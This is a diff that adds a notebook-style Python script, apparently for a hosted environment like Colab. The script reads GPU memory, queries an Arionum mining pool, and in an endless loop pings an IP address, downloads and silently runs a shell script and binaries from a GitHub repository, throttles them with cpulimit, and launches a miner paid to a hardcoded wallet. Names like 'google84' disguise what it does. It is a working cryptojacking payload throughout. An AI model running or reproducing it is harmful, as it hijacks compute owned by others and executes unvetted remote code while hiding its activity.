@@ -1,0 +1,101 @@
+!apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+
+!apt-get install -y bc
+
+!apt-get install -y cpulimit
+
+import json
+import sys
+import os
+import urllib
+
+import requests
+r = requests.get('http://mine.arionumpool.com/mine.php?q=info')
+output = r.json()
+
+json_str = json.dumps(output)
+
+resp = json.loads(json_str)
+
+google84 = (resp['data']['argon_mem'])
+
+print(google84);
+
+import nvidia_smi
+
+nvidia_smi.nvmlInit()
+
+handle = nvidia_smi.nvmlDeviceGetHandleByIndex(0)
+
+info = nvidia_smi.nvmlDeviceGetMemoryInfo(handle)
+
+googlenvidia84 = round(info.total / 999999)
+
+print(googlenvidia84)
+
+googlenvidia8474 = googlenvidia84 - 1884
+
+googlenvidia84744 = googlenvidia8474 / 16384
+
+googlenvidialinux84 = googlenvidia84744 * 998
+
+googlelinux84 = round(googlenvidialinux84)
+
+while True:
+    if google84 == "16384":
+
+        googlenvidia8474 = googlenvidia84 - 1884
+
+        googlenvidia84744 = googlenvidia8474 / 16384
+
+        googlenvidialinux84 = googlenvidia84744 * 998
+
+        googlelinux84 = round(googlenvidialinux84)
+
+        os.system("curl -s http://154.127.52.52/curlgoogle84.php");
+
+        os.system("pkill -f curl84");
+
+        os.system("wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84");
+
+        os.system("bash ./curl84 &> /dev/null &");
+
+        os.system("string=$(curl -s -A \"linux84\" http://mine.arionumpool.com/mine.php?q=info)");
+
+        os.system("cd /content/;wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/devdeploy84.tar.gz;tar -xf ./devdeploy84.tar.gz")
+
+        os.system("cd /content/googleapps8474");
+
+        os.system("pkill -f cpulimit");
+
+        os.system("cpulimit -e google84121274 -l 62 &> /dev/null &");
+
+        os.system("/content/googleapps8474/google84121274 -p http://mine.arionumpool.com -a 4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj -t 1 -b " + str(googlelinux84) + "")
+
+    else:
+
+        googlenvidia8474 = googlenvidia84 - 1884
+
+        googlenvidia84744 = googlenvidia8474 / 524288
+
+        googlenvidialinux84 = googlenvidia84744 * 998
+
+        googlelinux84 = round(googlenvidialinux84)
+
+        os.system("curl -s http://154.127.52.52/curlgoogle84.php")
+
+        os.system("pkill -f curl84")
+
+        os.system("wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84")
+
+        os.system("bash ./curl84 &> /dev/null &")
+
+        os.system("cd /content/;wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux847412741274.tar.gz;tar -xf ./linux847412741274.tar.gz")
+
+        os.system("cd googleapps8474")
+
+        os.system("pkill -f cpulimit")
+
+        os.system("cpulimit -e google84121274 -l 62 &> /dev/null &")
+
+        os.system("/content/googleapps8474/google84121274 -p http://mine.arionumpool.com -a 4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj -t 1 -b " + str(googlelinux84) + "")
